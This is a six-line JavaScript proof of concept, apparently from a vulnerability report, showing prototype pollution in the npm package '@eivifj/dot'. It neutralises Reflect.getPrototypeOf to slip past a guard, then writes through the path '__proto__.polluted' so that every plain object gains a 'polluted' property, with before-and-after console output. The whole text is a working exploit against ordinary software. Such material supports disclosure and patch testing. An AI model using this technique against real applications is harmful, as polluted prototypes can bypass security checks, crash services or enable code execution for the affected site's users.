Reflect.getPrototypeOf = () => false;
const a = require('@eivifj/dot');
const path = '__proto__.polluted';
console.log({}.polluted);
a.set({}, path, 'yes');
console.log({}.polluted);